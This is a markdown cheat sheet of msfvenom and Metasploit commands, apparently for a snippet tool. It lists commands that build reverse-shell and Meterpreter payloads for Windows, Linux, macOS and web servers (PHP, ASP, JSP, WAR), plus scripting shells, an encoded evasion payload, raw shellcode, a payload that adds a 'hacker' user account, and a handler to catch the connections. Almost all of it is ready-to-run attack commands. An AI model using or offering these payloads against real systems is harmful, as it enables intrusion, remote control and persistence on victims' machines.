# msfvenom

% msfvenom, reverse shell

#plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## msfvenom payloads list
```
msfvenom --list payloads
```

## msfvenom - payload windows x86 meterpeter unstagged
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
```

## Linux Meterpreter Reverse Shell
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
```

## Windows Meterpreter Reverse TCP Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
```

## Windows Reverse TCP Shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
```

## Windows Encoded Meterpreter Windows Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

## Mac Reverse Shell
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > shell.macho
```

## Web Payloads

## PHP Meterpreter Reverse TCP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
```

## ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp
```

## JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
```

## WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
```

# Scripting Payloads

## Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py
```

## Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
```

## Perl Unix Reverse shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > shell.pl
```

# msfvenom Shellcode

## Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
```

## Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
```

## Mac Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
```

## MCreate User
```
msfvenom -p windows/adduser USER=hacker PASS='Hacker123$' -f exe > adduser.exe
```

## Metasploit Handler
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport>; set payload windows/meterpreter/reverse_tcp; exploit"
```
